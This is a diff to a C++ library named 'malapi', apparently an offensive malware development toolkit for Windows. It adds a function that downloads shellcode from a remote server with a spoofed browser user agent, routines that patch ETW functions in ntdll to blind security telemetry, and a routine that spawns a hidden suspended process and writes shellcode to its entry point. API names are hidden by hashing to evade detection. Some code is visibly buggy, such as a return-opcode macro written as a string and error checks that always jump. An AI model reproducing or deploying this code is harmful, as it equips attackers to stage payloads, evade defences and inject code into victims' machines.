@@ -186,6 +186,7 @@ namespace malapi
 		SIZE_T bytes_written = 0;
 		PVOID address_ptr = NULL;
 		HMODULE kernel32 = NULL;
+		HMODULE ntdll = NULL;
 		DWORD old_protection = 0;
 
 		typeVirtualAllocExNuma VirtualAllocExNumaC = NULL;
@@ -193,14 +194,16 @@ namespace malapi
 		typeWriteProcessMemory WriteProcessMemoryC = NULL;
 		typeGetLastError GetLastErrorC = NULL;
 
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr ULONG hash_virtualallocexnuma = HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
 		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
 		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
-		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
 
 		kernel32 = GetModuleHandleC(hash_kernel32);
-		if (kernel32 == NULL) return NULL;
+		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		if (!kernel32 || !ntdll) return NULL;
 
 		VirtualAllocExNumaC = (typeVirtualAllocExNuma)GetProcAddressC(kernel32, hash_virtualallocexnuma);
 		VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
@@ -231,6 +234,168 @@ namespace malapi
 		else LOG_SUCCESS("Protection changed to RX.");
 
 		return address_ptr;
+	}
+
+	//
+	// Stage Shellcode to Memory via HTTPS
+	// Requires Valid SSL Certificate if using HTTPS
+	//
+	// Returns Shellcode & Shellcode Size
+	//
+	BOOL DownloadShellcode(_In_ LPCWSTR base_url, _In_ LPCWSTR uri_path, BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size)
+	{
+		BOOL success = FALSE;
+		HMODULE kernel32 = NULL;
+		HMODULE winhttp = NULL;
+
+		LPCWSTR user_agent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100 ABLELDR/1.1";
+		DWORD bytes_read = 0;
+		DWORD resp_size = 0;
+		PBYTE resp_buffer = NULL;
+		CHAR* resp_chunk[1024] = { 0 };
+
+		HINTERNET session = NULL;
+		HINTERNET connect = NULL;
+		HINTERNET request = NULL;
+
+#pragma region Imports
+
+		typeWinHttpOpen WinHttpOpenC = NULL;
+		typeWinHttpConnect WinHttpConnectC = NULL;
+		typeWinHttpSendRequest WinHttpSendRequestC = NULL;
+		typeWinHttpOpenRequest WinHttpOpenRequestC = NULL;
+		typeWinHttpReceiveResponse WinHttpReceiveResponseC = NULL;
+		typeWinHttpReadData WinHttpReadDataC = NULL;
+		typeWinHttpCloseHandle WinHttpCloseHandleC = NULL;
+
+		typeLoadLibraryA LoadLibraryC = NULL;
+		typeGetLastError GetLastErrorC = NULL;
+
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_loadlibrarya = HashStringFowlerNollVoVariant1a("LoadLibraryA");
+		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+
+		constexpr ULONG hash_winhttpopen = HashStringFowlerNollVoVariant1a("WinHttpOpen");
+		constexpr ULONG hash_winhttpconnect = HashStringFowlerNollVoVariant1a("WinHttpConnect");
+		constexpr ULONG hash_winhttpsendrequest = HashStringFowlerNollVoVariant1a("WinHttpSendRequest");
+		constexpr ULONG hash_winhttpopenrequest = HashStringFowlerNollVoVariant1a("WinHttpOpenRequest");
+		constexpr ULONG hash_winhttpreceiveresponse = HashStringFowlerNollVoVariant1a("WinHttpReceiveResponse");
+		constexpr ULONG hash_winhttpreaddata = HashStringFowlerNollVoVariant1a("WinHttpReadData");
+		constexpr ULONG hash_winhttpclosehandle = HashStringFowlerNollVoVariant1a("WinHttpCloseHandle");
+
+		kernel32 = GetModuleHandleC(hash_kernel32);
+
+		LoadLibraryC = (typeLoadLibraryA)GetProcAddressC(kernel32, hash_loadlibrarya);
+		winhttp = LoadLibraryC("Winhttp.dll");
+		//PDARKMODULE winhttp_dll = DarkLoadLibrary(LOAD_LOCAL_FILE, L"C:\\Windows\\System32\\winhttp.dll", NULL, 0, NULL);
+		//winhttp = (HMODULE)winhttp_dll->ModuleBase;
+
+		if (!kernel32 || !winhttp) goto CLEANUP;
+
+		WinHttpOpenC = (typeWinHttpOpen)GetProcAddressC(winhttp, hash_winhttpopen);
+		WinHttpConnectC = (typeWinHttpConnect)GetProcAddressC(winhttp, hash_winhttpconnect);
+		WinHttpSendRequestC = (typeWinHttpSendRequest)GetProcAddressC(winhttp, hash_winhttpsendrequest);
+		WinHttpOpenRequestC = (typeWinHttpOpenRequest)GetProcAddressC(winhttp, hash_winhttpopenrequest);
+		WinHttpReceiveResponseC = (typeWinHttpReceiveResponse)GetProcAddressC(winhttp, hash_winhttpreceiveresponse);
+		WinHttpReadDataC = (typeWinHttpReadData)GetProcAddressC(winhttp, hash_winhttpreaddata);
+		WinHttpCloseHandleC = (typeWinHttpCloseHandle)GetProcAddressC(winhttp, hash_winhttpclosehandle);
+
+		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+
+#pragma endregion
+
+		session = WinHttpOpenC(user_agent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+		if (session == NULL)
+		{
+			LOG_ERROR("Failed to start session. (Code: %016llX)", GetLastErrorC());
+			goto CLEANUP;
+		}
+		LOG_SUCCESS("Session Started. (Code: %016llX)", session);
+
+		if (ssl_enabled)
+		{
+			LOG_INFO("Stager Over HTTPS");
+
+			connect = WinHttpConnectC(session, base_url, INTERNET_DEFAULT_HTTPS_PORT, 0);
+			if (connect == NULL)
+			{
+				LOG_ERROR("Failed to connect to web server. (Code: %016llX)", GetLastErrorC());
+				goto CLEANUP;
+			}
+			LOG_SUCCESS("Connected to Session. (Code: %016llX)", connect);
+
+			request = WinHttpOpenRequestC(connect, L"GET", uri_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE));
+			if (request == NULL)
+			{
+				LOG_ERROR("Failed to open request. (Code: %016llX)", GetLastErrorC());
+				goto CLEANUP;
+			}
+			LOG_SUCCESS("Request Opened For: %ls%ls. (Code: %016llX)", base_url, uri_path, request);
+		}
+		else
+		{
+			LOG_INFO("Stager Over HTTP");
+
+			connect = WinHttpConnectC(session, base_url, INTERNET_DEFAULT_HTTP_PORT, 0);
+			if (!connect)
+			{
+				LOG_ERROR("Failed to connect to web server. (Code: %016llX)", GetLastErrorC());
+				goto CLEANUP;
+			}
+			LOG_SUCCESS("Connected to Session. (Code: %016llX)", connect);
+
+			request = WinHttpOpenRequestC(connect, L"GET", uri_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (WINHTTP_FLAG_REFRESH));
+			if (request == NULL)
+			{
+				LOG_ERROR("Failed to open request. (Code: %016llX)", GetLastErrorC());
+				goto CLEANUP;
+			}
+			LOG_SUCCESS("Request Opened For: %ls%ls. (Code: %016llX)", base_url, uri_path, request);
+
+			if (!WinHttpSendRequestC(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
+			{
+				LOG_ERROR("Failed to Send Request. (Code: %016llX)", GetLastErrorC());
+				goto CLEANUP;
+			}
+			LOG_SUCCESS("Request Sent");
+		}
+
+		if (!WinHttpReceiveResponseC(request, NULL))
+		{
+			LOG_ERROR("Failed to Receive Response. (Code: %016llX)", GetLastErrorC());
+			goto CLEANUP;
+		}
+		LOG_SUCCESS("Request Received");
+
+		do {
+			if (!WinHttpReadDataC(request, resp_chunk, sizeof(resp_chunk), &bytes_read) || bytes_read == 0)
+			{
+				LOG_INFO("Failed to Read Data or All Data Has Been Read. (Code: %016llX)", GetLastErrorC());
+			}
+
+			if (!resp_buffer)
+			{
+				resp_buffer = (PBYTE)HeapAlloc(bytes_read);
+			}
+			resp_buffer = (PBYTE)HeapReAlloc(resp_buffer, (resp_size + bytes_read));
+
+			resp_size += bytes_read;
+
+			memcpy(resp_buffer + (resp_size - bytes_read), resp_chunk, bytes_read);
+			memset(resp_chunk, 0, 1024);
+		} while (bytes_read > 0);
+
+		*shellcode = resp_buffer;
+		*shellcode_size = resp_size;
+
+		success = TRUE;
+		LOG_SUCCESS("Payload Downloaded Successfully.");
+
+	CLEANUP:
+		if (session) WinHttpCloseHandleC(session);
+		if (connect) WinHttpCloseHandleC(connect);
+		if (request) WinHttpCloseHandleC(request);
+		return success;
 	}
 
 	//
@@ -336,7 +501,7 @@ namespace malapi
 	// Patch ETW
 	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
 	//
-	BOOL PatchEtw()
+	BOOL PatchEtwSsn(void)
 	{
 		BOOL success = FALSE;
 		HMODULE kernel32 = NULL;
@@ -345,28 +510,124 @@ namespace malapi
 
 #pragma region imports
 		typeVirtualProtectEx VirtualProtectExC = NULL;
-		typeNtTraceEvent NtTraceEventC = NULL;
+		FARPROC NtTraceEventC = NULL;
 
-		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("NTDLL.DLL");
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr ULONG hash_nttraceevent = HashStringFowlerNollVoVariant1a("NtTraceEvent");
-		constexpr ULONG hash_virtualprotectex = malapi::HashStringFowlerNollVoVariant1a("VirtualProtectEx");
+		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
 
-		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
-		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		ntdll = GetModuleHandleC(hash_ntdll);
 		if (kernel32 == NULL || ntdll == NULL) return success;
 
-		VirtualProtectExC = (typeVirtualProtectEx)malapi::GetProcAddressC(kernel32, hash_virtualprotectex);
-		NtTraceEventC = (typeNtTraceEvent)malapi::GetProcAddressC(ntdll, hash_nttraceevent);
+		VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
+		NtTraceEventC = (FARPROC)GetProcAddressC(ntdll, hash_nttraceevent);
 
 #pragma endregion
 
-		VirtualProtectExC(0, NtTraceEventC, 1, PAGE_EXECUTE_READWRITE, &old_protection);
-		memcpy(NtTraceEventC, "\xc3", 1);
-		VirtualProtectExC(0, NtTraceEventC, 1, old_protection, &old_protection);
+#define x64_ret "0x3c"
+
+		if (!VirtualProtectExC(0, NtTraceEventC, 1, PAGE_EXECUTE_READWRITE, &old_protection)) goto CLEANUP;
+		memcpy(NtTraceEventC, x64_ret, 1);
+		if (!VirtualProtectExC(0, NtTraceEventC, 1, old_protection, &old_protection)) goto CLEANUP;
 
 		success = TRUE;
 
+	CLEANUP:
+		return success;
+	}
+
+	//
+	// Patch ETW via EtwEventWrite/EtwEventWriteFull
+	// https://gist.github.com/wizardy0ga/7cadcc7484092ff25a218615005405b7
+	//
+	BOOL PatchEtwEventWrite(void)
+	{
+#define x64_ret		0xc3
+#define x64_mov		0xb8
+#define x64_stub	0x20
+#define x64_xor		0x48
+#define MAX_SEARCH_INDEX 0xFF
+
+		BOOL success = FALSE;
+		HMODULE kernel32 = NULL;
+		HMODULE ntdll = NULL;
+		DWORD old_protection = 0;
+		BYTE patch[] = {
+			x64_xor, 0x31, 0xC0, // xor rax, rax
+			x64_ret				 // ret
+		};
+		BYTE backup[sizeof(patch)] = { 0 };
+		int offset = 0;
+		int func_length = 0;
+
+#pragma region imports
+
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("kernel32.dll");
+		constexpr ULONG hash_virtualprotextex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
+
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_etweventwrite = HashStringFowlerNollVoVariant1a("EtwEventWrite");
+		constexpr ULONG hash_etweventwritefull = HashStringFowlerNollVoVariant1a("EtwEventWriteFull");
+
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		ntdll = GetModuleHandleC(hash_ntdll);
+		if (!ntdll || !kernel32) return success;
+
+		typeVirtualProtectEx VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotextex);
+		PBYTE EtwEventWriteC = (PBYTE)GetProcAddressC(ntdll, hash_etweventwrite);
+		PBYTE EtwEventWriteFullC = (PBYTE)GetProcAddressC(ntdll, hash_etweventwritefull);
+
+#pragma endregion
+
+		while (TRUE)
+		{
+			if (EtwEventWriteC[func_length] == x64_ret && EtwEventWriteC[func_length + 1] == 0xCC)
+				break;
+
+			if (func_length == MAX_SEARCH_INDEX)
+			{
+				LOG_ERROR("Unable to find EtwEventWrite");
+				goto CLEANUP;
+			}
+
+			func_length++;
+		}
+
+		while (!EtwEventWriteFullC)
+		{
+			if (EtwEventWriteC[func_length] == 0xE8)
+			{
+				offset = EtwEventWriteC[func_length + 1];
+				EtwEventWriteFullC = &EtwEventWriteC[func_length] + 1 + sizeof(DWORD) + offset;
+				break;
+			}
+
+			if (func_length == MAX_SEARCH_INDEX)
+			{
+				LOG_ERROR("Unable to find EtwEventWriteFull");
+				goto CLEANUP;
+			}
+			func_length--;
+		}
+
+		LOG_SUCCESS("Found EtwEventWriteFull at %016llX", EtwEventWriteFullC);
+
+		if (!VirtualProtectExC(0, EtwEventWriteFullC, sizeof(patch), PAGE_READWRITE, &old_protection)) goto CLEANUP;
+
+		memcpy(&backup, EtwEventWriteFullC, sizeof(patch)); // Backup the EtwEventWriteFull address
+		memcpy(EtwEventWriteFullC, &patch, sizeof(patch)); // Patch the address
+
+		// Restore opcodes if mem protections cannot be reverted
+		if (!VirtualProtectExC(0, EtwEventWriteFullC, sizeof(patch), old_protection, &old_protection))
+		{
+			memcpy(EtwEventWriteFullC, &backup, sizeof(patch));
+			goto CLEANUP;
+		}
+
+		success = TRUE;
+	CLEANUP:
 		return success;
 	}
 
@@ -436,6 +697,23 @@ namespace malapi
 
 		// RtlAllocateHeap returns NULL on failure so no need to add error handling.
 		return RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
+	}
+
+	//
+	// ReAllocate a block of memory in the current process' heap.
+	// Returns a pointer to the allocated block, or NULL on failure.
+	//
+	PVOID HeapReAlloc(_In_ PVOID BlockAddress, _In_ SIZE_T Size)
+	{
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_rtlreallocateheap = HashStringFowlerNollVoVariant1a("RtlReAllocateHeap");
+
+		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
+		if (!ntdll) return NULL;
+		typeRtlReAllocateHeap RtlReAllocateHeap = (typeRtlReAllocateHeap)GetProcAddressC(ntdll, hash_rtlreallocateheap);
+		if (!RtlReAllocateHeap) return NULL;
+
+		return RtlReAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, BlockAddress, Size);
 	}
 
 	//
@@ -684,7 +962,7 @@ namespace malapi
 
 	//
 	// Create Suspended Process
-	// RETURN ProcessHandle
+	// Return ProcessHandle
 	//
 	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path)
 	{
@@ -693,17 +971,15 @@ namespace malapi
 
 #pragma region winapi_imports
 
-		typeCreateProcessA CreateProcessC = NULL;
-		typeCloseHandle CloseHandleC = NULL;
-
 		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
 		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");
 
 		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
-		if (!kernel32) return NULL;
-		CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
-		CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
+		if (!kernel32) return INVALID_HANDLE_VALUE;
+
+		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
+		typeCloseHandle CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
 
 #pragma endregion
 
@@ -712,7 +988,7 @@ namespace malapi
 
 		si.cb = sizeof(STARTUPINFOA);
 
-		BOOL success = CreateProcessC(0, file_path, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
+		BOOL success = CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi);
 
 		if (!success) return NULL;
 
@@ -722,47 +998,45 @@ namespace malapi
 
 	//
 	// CreateSuspendedProcess
-	// Return Handle to Thread
+	// Return ThreadHandle
 	//
 	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
 	{
 		STARTUPINFOA si = {};
 		PROCESS_INFORMATION pi = {};
 		PROCESS_BASIC_INFORMATION pbi = {};
-		DWORD ret_length = 0;
+		DWORD return_length = 0;
 		DWORD peb_offset = 0;
-		LPVOID image_base = 0;
-		LPVOID code_entry = 0;
+		LPVOID image_base;
+		LPVOID code_entry;
 		BYTE headers_buffer[4096] = {};
 
-#pragma region winapi_imports
+		PIMAGE_DOS_HEADER dos_header = NULL;
+		PIMAGE_NT_HEADERS nt_headers = NULL;
 
-		typeCreateProcessA CreateProcessC = NULL;
-		typeCloseHandle CloseHandleC = NULL;
-		typeNtQueryInformationProcess NtQueryInformationProcessC = NULL;
-		typeGetLastError GetLastErrorC = NULL;
-		typeWriteProcessMemory WriteProcessMemoryC = NULL;
-		typeReadProcessMemory ReadProcessMemoryC = NULL;
+#pragma region imports
 
 		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("NTDLL.DLL");
+		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
 		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");
 		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
-		constexpr DWORD hash_readprocessmemory = HashStringFowlerNollVoVariant1a("ReadProcessMemory");
-		constexpr DWORD hash_ntqueryinformationprocess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");
 		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+
+		constexpr DWORD hash_ntqueryinformationprocess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");
+		constexpr DWORD hash_ntreadvirtualmemory = HashStringFowlerNollVoVariant1a("NtReadVirtualMemory");
 
 		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
 		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
-		if (kernel32 == NULL || ntdll == NULL) return NULL;
+		if (!kernel32 || !ntdll) return NULL;
 
-		CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
-		CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
-		WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
-		ReadProcessMemoryC = (typeReadProcessMemory)GetProcAddressC(kernel32, hash_readprocessmemory);
-		NtQueryInformationProcessC = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_ntqueryinformationprocess);
-		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
+		typeCloseHandle CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
+		typeWriteProcessMemory WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
+		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+
+		typeNtQueryInformationProcess NtQueryInformationProcessC = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_ntqueryinformationprocess);
+		typeNtReadVirtualMemory NtReadVirtualMemoryC = (typeNtReadVirtualMemory)GetProcAddressC(ntdll, hash_ntreadvirtualmemory);
 
 #pragma endregion
 
@@ -772,24 +1046,55 @@ namespace malapi
 
 		si.cb = sizeof(STARTUPINFOA);
 
-		if (!CreateProcessC(0, file_path, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
+		if (CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi) == 0)
 		{
 			LOG_ERROR("Failed to Create Process. (Code: %016llX)", GetLastErrorC());
+			goto CLEANUP;
 		}
 
-		NtQueryInformationProcessC(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ret_length);
-		peb_offset = (DWORD)pbi.PebBaseAddress + 8;
+		LOG_INFO("Process Handle: %p", pi.hProcess);
+		LOG_INFO("Thread Handle: %p", pi.hThread);
 
-		if (!ReadProcessMemoryC(pi.hProcess, (LPVOID)peb_offset, &image_base, 4, NULL)) LOG_ERROR("Failed to get Target Process' Image Base Address. (Code: %016llX)", GetLastErrorC()); return NULL;
+		NtQueryInformationProcessC(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &return_length);
+
+#ifdef _WIN64
+		peb_offset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;
+		LOG_INFO("PEB: %016llX", pbi.PebBaseAddress);
+		LOG_INFO("PEB Offset: %016llX", peb_offset);
+		if (!NTSTATUS(NtReadVirtualMemoryC(pi.hProcess, (LPVOID)peb_offset, &image_base, sizeof(LPVOID), NULL)))
+		{
+			LOG_ERROR("Failed to get Target Process' Image Base Address. (Code: %016llX)", GetLastErrorC());
+			goto CLEANUP;
+		}
 		LOG_SUCCESS("Image Base Address: %016llX", image_base);
-		if (!ReadProcessMemoryC(pi.hProcess, (LPVOID)image_base, headers_buffer, 4096, NULL)) LOG_ERROR("Failed to Target Process' Image Headers. (Code: %016llX)", GetLastErrorC()); return NULL;
+#else
+		peb_offset = (DWORD)pbi.PebBaseAddress + 0x8;
+		LOG_INFO("PEB: %08lX", pbi.PebBaseAddress);
+		LOG_INFO("PEB Offset: %08lX", peb_offset);
+		if (NtReadVirtualMemoryC(pi.hProcess, (LPVOID)peb_offset, &image_base, 4, NULL) == 0) LOG_ERROR("Failed to get Target Process' Image Base Address. (Code: %08lX)", GetLastErrorC()); goto CLEANUP;
+		LOG_SUCCESS("Image Base Address: %08lX", image_base);
+#endif
+		if (!NTSTATUS(NtReadVirtualMemoryC(pi.hProcess, (LPVOID)image_base, headers_buffer, sizeof(headers_buffer), NULL)))
+		{
+			LOG_ERROR("Failed to Target Process' Image Headers. (Code: %016llX)", GetLastErrorC());
+			goto CLEANUP;
+		}
+		//NtReadVirtualMemoryC(pi.hProcess, (LPVOID)image_base, headers_buffer, sizeof(headers_buffer), NULL);
+		LOG_SUCCESS("Got Image Headers: %p", image_base);
 
-		PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)headers_buffer;
-		PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((PDWORD)headers_buffer + dos_header->e_lfanew);
-		code_entry = (LPVOID)(nt_headers->OptionalHeader.AddressOfEntryPoint + (DWORD)image_base);
+		dos_header = (PIMAGE_DOS_HEADER)headers_buffer;
 
-		if (!WriteProcessMemoryC(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); return NULL;
+#ifdef _WIN64
+		nt_headers = (PIMAGE_NT_HEADERS64)((DWORD_PTR)headers_buffer + dos_header->e_lfanew);
+#else
+		nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)headers_buffer + dos_header->e_lfanew);
+#endif
+		code_entry = (LPVOID)(nt_headers->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)image_base);
+
+		if (!WriteProcessMemoryC(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); goto CLEANUP;
 		LOG_SUCCESS("Shellcode written to: %016llX", code_entry);
+
+	CLEANUP:
 		return pi.hThread;
 	}
 
@@ -882,5 +1187,14 @@ namespace malapi
 		}
 
 		return;
+	}
+
+	//
+	// Sets the current service status and reports it to the SCM.
+	// Return None
+	//
+	VOID ReportSvcStatus(DWORD current_state, DWORD exit_code, DWORD wait_hint)
+	{
+		static DWORD checkpoint = 1;
 	}
 }
